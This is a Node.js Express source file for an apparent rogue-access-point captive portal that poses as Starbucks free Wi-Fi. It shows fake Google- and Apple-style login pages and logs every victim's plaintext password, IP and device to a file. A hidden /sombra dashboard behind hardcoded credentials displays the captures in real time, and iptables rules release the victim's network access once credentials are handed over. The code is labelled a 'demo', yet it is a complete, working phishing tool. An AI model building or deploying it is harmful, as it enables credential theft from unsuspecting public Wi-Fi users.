const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const flash = require('connect-flash');
const path = require('path');
const crypto = require('crypto');
const net = require('net');
const fs = require('fs');
const { execFile } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

// Trust the first hop (reverse proxy / load balancer) so req.ip picks up the
// real client address from X-Forwarded-For instead of the proxy's IP.
app.set('trust proxy', 1);

// Middleware
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: 'your-secret-key', // Change this in production
  resave: false,
  saveUninitialized: false
}));
app.use(flash());

// ---------- Captive-portal host fallback (Pi mode) ----------
// On the Pi, dnsmasq answers every DNS query with the Pi's own IP, so
// captive-portal probes (generate_204, hotspot-detect.html, ...) and any
// other foreign Host header land here. Unknown hosts are redirected to the
// portal page. Direct-IP access and known local hosts always pass through.
// Clients already unlocked by grantNetwork get a bare 204 (the OS treats a
// 204 as "internet works" and dismisses the captive portal).
const KNOWN_HOSTS = new Set(['localhost', '127.0.0.1', '::1', '[::1]', '0.0.0.0']);
const EXTRA_HOSTS = new Set(
  String(process.env.PORTAL_HOSTS || '').split(',').map(s => s.trim().toLowerCase()).filter(Boolean)
);
const grantedIps = new Set(); // client IPs unlocked by grantNetwork (Pi mode only)

function portalBase(req) {
  const env = process.env.PORTAL_REDIRECT_BASE;
  if (env) return env.replace(/\/+$/, '');
  return 'http://' + normalizeIp(req.socket.localAddress || '127.0.0.1');
}

// The whole fallback runs ONLY in Pi mode: PORTAL_ENABLED=1 is set by the
// Pi's systemd unit (pi-portal/setup.sh writes it into /etc/starbucks-portal.env).
// Without this gate, any deployment behind a real hostname (Render, VPS, ...)
// would treat every request as an "unknown host" and redirect it to a local
// socket address (127.0.0.1), breaking the site.
const PORTAL_ENABLED = process.env.PORTAL_ENABLED === '1';

app.use((req, res, next) => {
  if (!PORTAL_ENABLED) return next();
  const host = String(req.hostname || '').toLowerCase();
  if (!host || KNOWN_HOSTS.has(host) || EXTRA_HOSTS.has(host) || net.isIP(host) > 0) return next();
  if (grantedIps.has(normalizeIp(req.ip))) {
    // Already unlocked: answer captive probes (and anything else the OS or
    // browser fires at us) with 204 so the portal closes for good.
    return res.status(204).end();
  }
  return res.redirect(portalBase(req) + '/');
});

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// In-memory user store (for demo purposes only)
let users = [];

// ---------- Durable credential log (instance/creds.txt) ----------
// Every capture is appended as one JSON line, so the Pi keeps a plain-text
// log on disk in addition to the /sombra dashboard. On boot the file is
// re-imported, restoring the in-memory store.
const CREDS_FILE = path.join(__dirname, 'instance', 'creds.txt');

function ensureCredsFile() {
  fs.mkdirSync(path.dirname(CREDS_FILE), { recursive: true });
}

function appendCredsFile(user) {
  try {
    ensureCredsFile();
    const line = JSON.stringify({
      id: user.id,
      name: user.name,
      email: user.email,
      password: user.plainPassword,
      source: user.source,
      ip: user.ip,
      device: user.device,
      browser: user.browser,
      model: user.model,
      capturedAt: user.capturedAt
    });
    fs.appendFileSync(CREDS_FILE, line + '\n', 'utf8');
  } catch (e) {
    console.error('creds.txt write failed:', e.message);
  }
}

// Rebuild the in-memory store from the log at boot. Lines are deduplicated
// by id (last capture wins), matching the /sombra semantics where a
// re-login updates the same user.
async function loadCredsFile() {
  try {
    if (!fs.existsSync(CREDS_FILE)) return 0;
    const lines = fs.readFileSync(CREDS_FILE, 'utf8').split(/\r?\n/).filter(Boolean);
    const byId = new Map();
    for (const line of lines) {
      try {
        const rec = JSON.parse(line);
        if (!rec || typeof rec.email !== 'string') continue;
        byId.set(rec.id, {
          id: rec.id,
          name: rec.name || rec.email,
          email: rec.email,
          password: await bcrypt.hash(rec.password || '', 10),
          plainPassword: rec.password,
          source: rec.source === 'apple' ? 'apple' : 'google',
          capturedAt: rec.capturedAt || new Date().toISOString(),
          ip: rec.ip,
          device: rec.device || 'PC',
          browser: rec.browser || '',
          model: rec.model || ''
        });
      } catch (e) { /* skip malformed lines */ }
    }
    users = [...byId.values()];
    console.log('Loaded ' + users.length + ' credential(s) from ' + CREDS_FILE);
    return users.length;
  } catch (e) {
    console.error('creds.txt import failed:', e.message);
    return 0;
  }
}

// Short-lived access tokens for the /sombra dashboard. A new token is minted
// on each successful gate login and lives in the browser page's memory only,
// so refreshing /sombra always forces you to authenticate again.
const sombraTokens = new Map(); // token -> { createdAt }
const SOMBRA_TOKEN_TTL = 30 * 60 * 1000; // 30 minutes

function issueSombraToken() {
  const token = crypto.randomBytes(24).toString('hex');
  sombraTokens.set(token, { createdAt: Date.now() });
  return token;
}

function hasSombraToken(token) {
  if (!token) return false;
  if (typeof token !== 'string') return false;
  const rec = sombraTokens.get(token);
  if (!rec) return false;
  if (Date.now() - rec.createdAt > SOMBRA_TOKEN_TTL) {
    sombraTokens.delete(token);
    return false;
  }
  return true;
}

// ---------- Helpers ----------

function findUserByEmail(email) {
  return users.find(user => user.email === email);
}

// Only @gmail.com addresses are considered valid
function isValidEmailProvider(email) {
  if (typeof email !== 'string') return false;
  const atIndex = email.lastIndexOf('@');
  if (atIndex <= 0 || atIndex === email.length - 1) return false;
  return email.slice(atIndex + 1).toLowerCase() === 'gmail.com';
}

// Detect device type (APPLE/ANDROID/PC), browser and model from the
// User-Agent. The model is best-effort: Android UAs expose it (Pixel 8,
// SM-G991B, ...), iPhones only say "iPhone", so the iOS version is appended.
function detectDevice(ua) {
  ua = ua || '';
  const low = ua.toLowerCase();
  let device = 'PC';
  let browser = '';
  let model = '';

  if (/iphone|ipad|ipod/.test(low)) {
    device = 'APPLE';
    model = /iPad/.test(ua) ? 'iPad' : /iPod/.test(ua) ? 'iPod' : 'iPhone';
    const ios = ua.match(/CPU (?:iPhone )?OS (\d+)[_\d]*/);
    if (ios) model += ' (iOS ' + ios[1] + ')';
  } else if (/android/.test(low)) {
    device = 'ANDROID';
    const m = ua.match(/Android [\d.]+; ([^;()]+)/);
    if (m) model = m[1].trim().replace(/\s+Build\/.*$/, '');
  } else {
    if (/windows/.test(low)) model = 'Windows';
    else if (/mac os x|macintosh/.test(low)) model = 'Mac';
    else if (/linux/.test(low)) model = 'Linux';
  }

  if (/edg\//.test(low)) browser = 'Edge';
  else if (/opr\/|opera/.test(low)) browser = 'Opera';
  else if (/samsungbrowser/.test(low)) browser = 'Samsung Internet';
  else if (/crios/.test(low)) browser = 'Chrome (iOS)';
  else if (/chrome\//.test(low)) browser = 'Chrome';
  else if (/fxios|firefox/.test(low)) browser = 'Firefox';
  else if (/safari\//.test(low)) browser = 'Safari';
  else browser = '?';

  return { device, browser, model };
}

// Normalize a socket IP into a readable form (::1 -> 127.0.0.1)
function normalizeIp(raw) {
  if (!raw) return 'unknown';
  if (raw === '::1') return '127.0.0.1';
  const m = raw.match(/::ffff:(\d+\.\d+\.\d+\.\d+)/);
  if (m) return m[1];
  return raw.replace('::ffff:', '') || 'unknown';
}

// IP + device details captured from the incoming request. The IP is the one
// the device is connected with (req.ip): on the Pi it is the phone's address
// on the AP subnet (e.g. 10.3.0.x); behind a reverse proxy it is the real
// client IP from X-Forwarded-For. NOT the router's public IP.
function captureMeta(req) {
  const meta = detectDevice(req.headers['user-agent'] || '');
  return {
    ip: normalizeIp(req.ip),
    device: meta.device,
    browser: meta.browser,
    model: meta.model
  };
}

// Create a user on the fly and capture the credentials (demo behavior)
async function createCapturedUser(email, password, source, name, req) {
  const user = {
    id: users.reduce((m, u) => Math.max(m, u.id || 0), 0) + 1,
    name: name || email,
    email,
    password: await bcrypt.hash(password, 10),
    plainPassword: password, // stored in plain text for the demo page only
    source,
    capturedAt: new Date().toISOString(),
    ...captureMeta(req)
  };
  appendCredsFile(user);
  return user;
}

// Re-capture the credentials for an already known user
function updateCapturedUser(user, password, source, req) {
  user.plainPassword = password;
  user.source = source;
  user.capturedAt = new Date().toISOString();
  Object.assign(user, captureMeta(req));
  appendCredsFile(user);
  return user;
}

// Format an ISO timestamp as HH:MM:SS for the dashboard
function formatTime(iso) {
  if (!iso) return '--:--:--';
  const d = new Date(iso);
  const pad = n => String(n).padStart(2, '0');
  return pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
}

// Format an ISO timestamp as GG/MM/AAAA HH:MM:SS for the toast
function formatDateTime(iso) {
  if (!iso) return '--/--/---- --:--:--';
  const d = new Date(iso);
  const pad = n => String(n).padStart(2, '0');
  return pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear() +
    ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
}

// Shape a stored user for the sombra dashboard
function toCredentialView(user) {
  return {
    id: user.id,
    email: user.email,
    password: user.plainPassword || '(not captured)',
    source: user.source === 'apple' ? 'apple' : 'google',
    ip: normalizeIp(user.ip),
    device: user.device || 'PC',
    browser: user.browser || '?',
    model: user.model || '',
    time: formatTime(user.capturedAt),
    date: formatDateTime(user.capturedAt),
    durationMs: 7000
  };
}

// Credentials in order of arrival (newest first)
function orderedCredentials() {
  return [...users]
    .sort((a, b) => new Date(b.capturedAt) - new Date(a.capturedAt))
    .map(toCredentialView);
}

// ---------- Network grant (Pi only) ----------
// After a successful login the phone is unblocked on the Pi's firewall.
// No-op unless PORTAL_GRANT=1 (only the Pi's systemd unit sets it). The IP
// used is the one the Pi sees on its AP interface (req.ip), NOT the
// browser-detected public IP — that one belongs to the router.
function grantNetwork(req) {
  if (process.env.PORTAL_GRANT !== '1') return;
  const clientIp = normalizeIp(req.ip);
  if (!clientIp || clientIp === 'unknown' || !net.isIP(clientIp)) return;
  grantedIps.add(clientIp);
  const chain = process.env.PORTAL_CHAIN || 'PORTAL_CLIENTS';
  const run = args => new Promise(resolve => {
    execFile('iptables', args, err => {
      if (err) console.error('grantNetwork (' + chain + '):', err.message);
      resolve();
    });
  });
  // remove any block, then allow — the chain ends in DROP
  run(['-D', chain, '-s', clientIp, '-j', 'DROP'])
    .then(() => run(['-I', chain, '-s', clientIp, '-j', 'ACCEPT']))
    .then(() => console.log('grantNetwork: unlocked ' + clientIp));
}

// ---------- Routes ----------

// Home page - Starbucks free Wi-Fi captive portal landing page
app.get('/', (req, res) => {
  res.render('index');
});

// Register page - GET
app.get('/register', (req, res) => {
  res.render('register', {
    messages: req.flash(),
    user: req.session.user
  });
});

// Register page - POST
app.post('/register', async (req, res) => {
  const { name, email, password, confirmPassword } = req.body;

  if (!name || !email || !password || !confirmPassword) {
    req.flash('error', 'All fields are required');
    return res.redirect('/register');
  }

  if (password !== confirmPassword) {
    req.flash('error', 'Passwords do not match');
    return res.redirect('/register');
  }

  // Only @gmail.com emails are valid: reject silently (red border is handled client-side)
  if (!isValidEmailProvider(email)) return res.redirect('/register');

  // Password must be at least 6 characters: reject silently
  if (password.length < 6) return res.redirect('/register');

  if (findUserByEmail(email)) {
    req.flash('error', 'Email already registered');
    return res.redirect('/register');
  }

  users.push(await createCapturedUser(email, password, 'google', name, req));
  req.flash('success', 'Registration successful! Please log in.');
  res.redirect('/login');
});

// Login page - GET
app.get('/login', (req, res) => {
  res.render('login', {
    messages: req.flash(),
    user: req.session.user
  });
});

// Apple-style login page - GET
app.get('/apple-login', (req, res) => {
  res.render('apple-login', {
    messages: req.flash(),
    user: req.session.user
  });
});

// Shared POST handler for both Google-style and Apple-style logins
async function handleLogin(req, res, source) {
  const redirectTo = source === 'apple' ? '/apple-login' : '/login';
  const { email, password } = req.body;

  if (!email || !password) {
    req.flash('error', 'Email and password are required');
    return res.redirect(redirectTo);
  }

  // Only @gmail.com emails are valid: reject silently (red border is handled client-side)
  if (!isValidEmailProvider(email)) return res.redirect(redirectTo);

  // Password must be at least 6 characters: reject silently
  if (password.length < 6) return res.redirect(redirectTo);

  let user = findUserByEmail(email);

  if (user) {
    if (!(await bcrypt.compare(password, user.password))) {
      req.flash('error', 'Invalid email or password');
      return res.redirect(redirectTo);
    }
    updateCapturedUser(user, password, source, req);
  } else {
    // Unknown email: register on the fly (demo behavior) and capture the credentials
    user = await createCapturedUser(email, password, source, email, req);
    users.push(user);
  }

  // Store user in session
  req.session.user = { id: user.id, name: user.name, email };

  // Login successful: unlock the phone on the Pi, then close the site
  grantNetwork(req);
  res.redirect('/close');
}

app.post('/login', (req, res) => handleLogin(req, res, 'google'));
app.post('/apple-login', (req, res) => handleLogin(req, res, 'apple'));

// Close page - shown after a successful login (tries to close the window)
app.get('/close', (req, res) => {
  res.render('close');
});

// Logout
app.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/');
  });
});

// Admin demo page (for cybersecurity demo)
// In a real app, this would be protected by proper admin authentication.
// For demo, we'll allow access if the query parameter demo=true is present.
// NOTE: This is NOT secure and only for demonstration purposes.
app.get('/admin/demo', (req, res) => {
  if (req.query.demo !== 'true') {
    req.flash('error', 'Access denied');
    return res.redirect('/');
  }

  // Prepare demo data: show the current users list and some fake events.
  const demoData = {
    users: users.map(user => ({
      id: user.id,
      name: user.name,
      email: user.email
      // Note: We do not expose passwords in the demo
    })),
    events: [
      { type: 'registration', email: 'test@example.com', timestamp: new Date(), success: true },
      { type: 'login', email: 'test@example.com', timestamp: new Date(), success: true },
      { type: 'login', email: 'wrong@example.com', timestamp: new Date(), success: false }
    ]
  };

  res.render('admin/demo_english', {
    messages: req.flash(),
    user: req.session.user,
    demoData
  });
});

// Read the /sombra access token from query string (page memory) or body (delete form)
function sombraToken(req) {
  return req.query.tk || (req.body && req.body.tk);
}

// Sombra access gate: /sombra requires sombr4/sombr4, issuing a short-lived
// token held only in the rendered page. Refreshing the page (no token) re-asks.
function requireSombra(req, res, next) {
  if (hasSombraToken(sombraToken(req))) return next();
  if (req.path === '/sombra/latest') return res.status(401).json({ ok: false, error: 'unauthorized' });
  if (req.path.startsWith('/sombra/delete')) return res.redirect('/sombra');
  return res.render('sombra-login', { fail: req.query.fail === '1' });
}

// Sombra login - POST (gate credentials). Success mints a token and redirects
// with ?tk=..., so authentication is never remembered between page loads.
app.post('/sombra/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'sombr4' && password === 'sombr4') {
    return res.redirect('/sombra?tk=' + issueSombraToken());
  }
  return res.redirect('/sombra?fail=1');
});

// Sombra page - hidden credentials viewer (demo only)
// Not linked anywhere on the site: reachable only by typing /sombra in the URL bar.
app.get('/sombra', requireSombra, (req, res) => {
  res.render('sombra', { users: orderedCredentials(), tk: req.query.tk });
});

// Latest captured credential + full credentials list (JSON)
// used by /sombra for real-time updates without a page refresh.
app.get('/sombra/latest', requireSombra, (req, res) => {
  const last = users[users.length - 1];
  res.json({
    ok: true,
    credential: last ? toCredentialView(last) : null,
    users: orderedCredentials()
  });
});

// Delete a captured credential from the sombra page
app.post('/sombra/delete/:id', requireSombra, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const index = users.findIndex(user => user.id === id);
  if (index !== -1) users.splice(index, 1);
  res.redirect('/sombra?tk=' + sombraToken(req));
});

// Start server (the credentials log is re-imported first)
async function main() {
  await loadCredsFile();
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}
main();

module.exports = app;
